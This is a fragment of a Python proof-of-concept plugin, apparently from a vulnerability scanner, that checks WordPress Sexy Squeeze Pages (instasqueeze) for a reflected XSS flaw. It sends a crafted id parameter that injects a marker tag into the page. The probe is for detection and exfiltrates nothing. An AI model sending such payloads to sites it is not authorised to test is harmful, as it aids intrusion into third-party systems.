...
def get_plugin_info():
    plugin_info = {
        ...
        "desc": "WordPress Sexy Squeeze Pages Plugin 存在反射型XSS漏洞",
        "grade": "高",
        "type": "web",
...
def poc(arg):
    ...
    try:
        r = requests.get(
            url=f'{urlparse(arg).scheme}://{urlparse(arg).netloc}/wp-content/plugins/instasqueeze/lp/index.php?id=\"/><test>test({rand_str})</test>', 
            headers=headers,
            timeout=timeout, 
            verify=False
            )
